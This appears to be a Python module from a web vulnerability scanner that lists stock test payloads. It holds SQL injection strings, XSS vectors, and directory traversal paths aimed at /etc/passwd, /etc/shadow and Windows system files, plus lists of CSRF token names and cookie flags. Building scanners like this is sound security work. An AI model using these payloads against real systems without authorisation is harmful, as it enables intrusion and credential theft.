# src/utils/payloads.py

"""
Common payload sets for vulnerability scanning.
These payloads can be used by plugins (SQLi, XSS, CSRF, etc.).
"""

# SQL Injection payloads
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 'a'='a",
    "' OR 1=1--",
    "admin' --",
    "' UNION SELECT NULL,NULL,NULL--",
    "' OR '1'='1' /*"
]

# Cross-Site Scripting (XSS) payloads
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert(1)>",
    "<iframe src=javascript:alert('XSS')>",
    "<svg><script>alert(1)</script>",   # ✔ fixed
    "<body onload=alert('XSS')>"
]

# CSRF tokens (example weak token identifiers)
CSRF_TOKENS = [
    "csrf_token",
    "authenticity_token",
    "__RequestVerificationToken"
]

# Directory traversal payloads
DIR_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "/etc/shadow",
    "C:\\boot.ini"
]

# Insecure cookie flag checks
COOKIE_FLAGS = [
    "HttpOnly",
    "Secure",
    "SameSite"
]

if __name__ == "__main__":
    print("[Test] SQLi Payloads:", SQLI_PAYLOADS[:3])
    print("[Test] XSS Payloads:", XSS_PAYLOADS[:2])